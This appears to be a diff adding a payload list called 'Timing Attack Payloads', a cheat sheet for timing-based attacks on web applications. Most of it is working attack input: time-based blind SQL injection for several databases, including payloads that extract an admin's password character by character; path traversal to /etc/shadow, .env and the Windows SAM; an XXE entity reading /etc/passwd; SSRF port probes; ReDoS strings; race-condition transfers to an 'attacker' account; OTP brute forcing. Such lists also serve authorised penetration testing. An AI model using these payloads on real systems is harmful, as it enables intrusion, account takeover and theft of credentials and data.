@@ -1,0 +1,481 @@
+# Timing Attack Payloads
+
+# ============================================
+# 1. USER ENUMERATION VIA TIMING
+# ============================================
+
+# Test usernames (measure response time differences)
+username=admin
+username=administrator
+username=root
+username=test
+username=user
+username=nonexistent_user_12345
+username=aaaaaaaaaaaaaaaaaaaa
+
+# Email enumeration
+email=admin@example.com
+email=user@example.com
+email=nonexistent@example.com
+email=invalid@invalid.invalid
+
+# ============================================
+# 2. PASSWORD LENGTH DISCOVERY
+# ============================================
+
+# Try passwords of increasing length
+password=a
+password=ab
+password=abc
+password=abcd
+password=abcde
+password=abcdef
+password=abcdefgh
+password=abcdefghij
+password=abcdefghijkl
+password=abcdefghijklmno
+password=abcdefghijklmnopqrst
+
+# ============================================
+# 3. SQL TIMING INJECTION PAYLOADS
+# ============================================
+
+# Basic sleep-based payloads
+' OR SLEEP(5) --
+' OR IF(1=1, SLEEP(5), 0) --
+' AND SLEEP(5) --
+admin' AND SLEEP(5) --
+admin' OR SLEEP(5) #
+
+# MySQL time-based blind SQL injection
+' OR IF((SELECT COUNT(*) FROM users)>0, SLEEP(5), 0) --
+' OR IF(SUBSTRING(DATABASE(),1,1)='a', SLEEP(5), 0) --
+' OR IF(LENGTH(DATABASE())>5, SLEEP(5), 0) --
+' AND IF((SELECT user FROM mysql.user LIMIT 1)='root', SLEEP(5), 0) --
+
+# PostgreSQL time-based
+' OR pg_sleep(5) --
+'; SELECT pg_sleep(5) --
+' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
+
+# MSSQL time-based
+'; WAITFOR DELAY '00:00:05' --
+' OR WAITFOR DELAY '00:00:05' --
+'; IF (1=1) WAITFOR DELAY '00:00:05' --
+' AND (SELECT COUNT(*) FROM users) > 0; WAITFOR DELAY '00:00:05' --
+
+# Oracle time-based
+' OR DBMS_LOCK.SLEEP(5) --
+' AND DBMS_LOCK.SLEEP(5) --
+
+# SQLite time-based
+' OR randomblob(100000000) --
+' AND randomblob(100000000) --
+
+# Heavy computation (alternative to SLEEP)
+' OR BENCHMARK(5000000, SHA1('test')) --
+' AND BENCHMARK(10000000, MD5('test')) --
+
+# Conditional time delays
+' OR IF((SELECT COUNT(*) FROM users WHERE username='admin')=1, SLEEP(5), 0) --
+' OR IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0) --
+' OR IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96, SLEEP(5), 0) --
+
+# Data exfiltration via timing
+' OR IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a', SLEEP(5), 0) --
+' OR IF((SELECT SUBSTRING(password,2,1) FROM users WHERE username='admin')='b', SLEEP(5), 0) --
+
+# ============================================
+# 4. TOKEN VALIDATION TIMING
+# ============================================
+
+# Valid format tokens (will take longer to validate)
+token=550e8400-e29b-41d4-a716-446655440000
+token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+# Invalid format tokens (will fail fast)
+token=invalid
+token=12345
+token=abc123
+token=test
+token=null
+
+# ============================================
+# 5. OTP/PIN TIMING BRUTE FORCE
+# ============================================
+
+# 4-digit PIN testing (measure time for each)
+pin=0000
+pin=0001
+pin=0002
+pin=1111
+pin=1234
+pin=5555
+pin=9999
+
+# 6-digit OTP testing
+otp=000000
+otp=111111
+otp=123456
+otp=654321
+otp=999999
+
+# Character-by-character timing
+otp=100000
+otp=200000
+otp=300000
+# If 1xxxxx takes longer, first digit is 1
+
+otp=110000
+otp=120000
+otp=130000
+# Continue for each position
+
+# ============================================
+# 6. SESSION VALIDATION TIMING
+# ============================================
+
+# Valid UUID format sessions
+session_id=550e8400-e29b-41d4-a716-446655440000
+session_id=123e4567-e89b-12d3-a456-426614174000
+
+# Invalid format sessions
+session_id=invalid
+session_id=12345
+session_id=test_session
+
+# Sequential session IDs
+session_id=1
+session_id=2
+session_id=100
+session_id=1000
+
+# ============================================
+# 7. FILE EXISTENCE TIMING
+# ============================================
+
+# Common file paths
+file=../../../../../../etc/passwd
+file=../../../../../../etc/shadow
+file=../../../../../../etc/hosts
+file=../../../../../../var/log/apache2/access.log
+file=../../../config/database.yml
+file=../../../.env
+file=../../../.git/config
+
+# Windows paths
+file=C:\Windows\System32\config\SAM
+file=C:\Windows\win.ini
+file=C:\boot.ini
+
+# ============================================
+# 8. CRYPTOGRAPHIC TIMING ATTACKS
+# ============================================
+
+# RSA signature verification timing
+signature=<various_signatures>
+# Measure verification time to leak key bits
+
+# HMAC timing attacks
+hmac=correct_hmac_value
+hmac=incorrect_hmac_value
+# Non-constant-time comparison leaks information
+
+# Password hash comparison
+password_hash=correct_bcrypt_hash
+password_hash=incorrect_bcrypt_hash
+
+# ============================================
+# 9. CACHE TIMING DETECTION
+# ============================================
+
+# Request same resource multiple times
+GET /api/user/1
+GET /api/user/1
+GET /api/user/1
+# Second and third should be faster if cached
+
+# Resource enumeration via cache
+GET /api/user/1
+GET /api/user/2
+GET /api/user/3
+GET /api/user/100
+# Cached resources respond faster
+
+# ============================================
+# 10. RACE CONDITION TIMING
+# ============================================
+
+# Send simultaneous requests
+# POST /transfer amount=1000&from=victim&to=attacker
+# (send 10 requests simultaneously)
+
+# Parallel password reset
+# POST /forgot-password email=victim@example.com
+# (send multiple requests in parallel)
+
+# Concurrent registration
+# POST /register username=attacker&email=test@example.com
+# (send multiple requests with same email)
+
+# ============================================
+# 11. RATE LIMITING DETECTION
+# ============================================
+
+# Send rapid requests to detect rate limiting
+# Request 1-100 to same endpoint
+# Measure time for each
+# Detect when responses start taking longer
+
+# ============================================
+# 12. DATABASE QUERY TIMING
+# ============================================
+
+# Boolean-based timing
+query=' OR '1'='1' AND SLEEP(5) --
+query=' OR '1'='2' AND SLEEP(5) --
+# First one sleeps, second one doesn't
+
+# Conditional queries with timing
+search=test' AND (SELECT COUNT(*) FROM users)>0 AND SLEEP(5) --
+search=test' AND (SELECT COUNT(*) FROM users)>1000 AND SLEEP(5) --
+
+# ============================================
+# 13. AUTHENTICATION ENDPOINT TIMING
+# ============================================
+
+# Login timing comparison
+username=admin&password=wrongpassword
+username=nonexistent&password=wrongpassword
+# Measure difference in response time
+
+# 2FA timing
+otp=000000
+otp=111111
+otp=123456
+# Measure validation time
+
+# ============================================
+# 14. API ENDPOINT TIMING
+# ============================================
+
+# Valid vs invalid API keys
+Authorization: Bearer valid_format_key_12345678901234567890
+Authorization: Bearer invalid
+# Valid format takes longer to validate
+
+# Permission check timing
+GET /api/admin/users (with admin token)
+GET /api/admin/users (with user token)
+# Different timing reveals permission check depth
+
+# ============================================
+# 15. SEARCH FUNCTIONALITY TIMING
+# ============================================
+
+# Search for existing vs non-existing data
+search=admin
+search=nonexistent_data_12345
+# Existing data may take longer to retrieve
+
+# Wildcard search timing
+search=a%
+search=admin%
+search=administrator%
+# Results count affects timing
+
+# ============================================
+# 16. COMPARISON TIMING ATTACKS
+# ============================================
+
+# Secret comparison (character-by-character)
+secret=a000000000
+secret=b000000000
+secret=c000000000
+# If 'a' is correct first character, it takes slightly longer
+
+# Token comparison
+token=a123456789012345
+token=b123456789012345
+# Non-constant-time comparison leaks information
+
+# ============================================
+# 17. HMAC VERIFICATION TIMING
+# ============================================
+
+# Correct HMAC
+hmac=2d5f8f5e1c8b9a7f3e4d6c2b1a0f9e8d
+
+# Incorrect HMAC (different lengths)
+hmac=incorrect
+hmac=1234567890abcdef
+hmac=ffffffffffffffffffffffffffffffff
+
+# ============================================
+# 18. BACKUP CODE TIMING
+# ============================================
+
+# Test backup codes
+backup_code=ABCD-EFGH-IJKL-MNOP
+backup_code=1234-5678-9012-3456
+backup_code=invalid
+
+# ============================================
+# 19. EMAIL VALIDATION TIMING
+# ============================================
+
+# Existing email addresses
+email=admin@example.com
+email=user@example.com
+
+# Non-existing email addresses
+email=nonexistent@example.com
+email=invalid@invalid.com
+
+# ============================================
+# 20. PERMISSION CHECK TIMING
+# ============================================
+
+# Access with different permission levels
+GET /api/resource/1 (as admin)
+GET /api/resource/1 (as user)
+GET /api/resource/1 (as guest)
+# Different permission checks take different times
+
+# ============================================
+# 21. REGEX TIMING ATTACKS (ReDoS)
+# ============================================
+
+# Exponential backtracking patterns
+input=(a+)+b
+input=aaaaaaaaaaaaaaaaaaaaaaaa!
+input=(a|a)*b
+input=(a|ab)*c
+
+# Email validation ReDoS
+email=a@a.a....(repeat many times)...@a.a
+email=aaaaaaaaaaaaaaaaaaaaaa@aaaaaaaaaa.com
+
+# URL validation ReDoS
+url=http://aaaaaaaaaaaaaaaaaaaaa....
+
+# ============================================
+# 22. CAPTCHA TIMING
+# ============================================
+
+# Correct CAPTCHA response
+captcha=correct_answer
+# Takes longer to validate
+
+# Incorrect CAPTCHA
+captcha=wrong_answer
+# Fails fast
+
+# ============================================
+# 23. WEBHOOK TIMING
+# ============================================
+
+# Valid webhook URLs
+webhook_url=https://attacker.com/callback
+# Timing reveals if webhook is called
+
+# Invalid webhook URLs
+webhook_url=invalid_url
+# Fails fast without making request
+
+# ============================================
+# 24. FILE UPLOAD TIMING
+# ============================================
+
+# Upload allowed file types
+file=image.jpg
+# Takes time to process
+
+# Upload disallowed file types
+file=shell.php
+# Fails fast
+
+# ============================================
+# 25. API VERSION TIMING
+# ============================================
+
+GET /api/v1/users (newer version with more checks)
+GET /api/v0/users (older version with fewer checks)
+# Different timing reveals version differences
+
+# ============================================
+# 26. SUBDOMAIN TIMING
+# ============================================
+
+# Check subdomain existence via timing
+GET https://admin.example.com
+GET https://api.example.com
+GET https://internal.example.com
+GET https://nonexistent.example.com
+# Existing subdomains may respond differently
+
+# ============================================
+# 27. HEADER VALIDATION TIMING
+# ============================================
+
+# Valid authentication headers
+Authorization: Bearer eyJhbGc...
+# Takes time to validate JWT
+
+# Invalid headers
+Authorization: Bearer invalid
+# Fails fast
+
+# ============================================
+# 28. CRYPTO OPERATION TIMING
+# ============================================
+
+# RSA operations with different keys
+public_key=<valid_key>
+public_key=<invalid_key>
+# Timing leaks key information
+
+# AES operations
+plaintext=aaaaaaaa
+plaintext=bbbbbbbb
+# Timing may leak key bits
+
+# ============================================
+# 29. BUSINESS LOGIC TIMING
+# ============================================
+
+# Discount code validation
+discount_code=VALID2024
+discount_code=INVALID
+# Valid codes take longer to validate
+
+# Referral code timing
+referral=VALID_REFERRAL
+referral=INVALID_CODE
+
+# ============================================
+# 30. TIME-BASED BLIND ATTACKS
+# ============================================
+
+# XML External Entity with timing
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+# Timing reveals if file exists
+
+# SSRF with timing
+url=http://localhost:22
+url=http://localhost:80
+url=http://localhost:3306
+# Open ports take longer to timeout
+
+# ============================================
+# STATISTICAL TIMING ANALYSIS
+# ============================================
+
+# For all above payloads, use statistical methods:
+# 1. Send each payload 50-100 times
+# 2. Calculate mean and standard deviation
+# 3. Compare distributions
+# 4. Use t-test or similar to determine significance
+# 5. Account for network jitter with multiple measurements
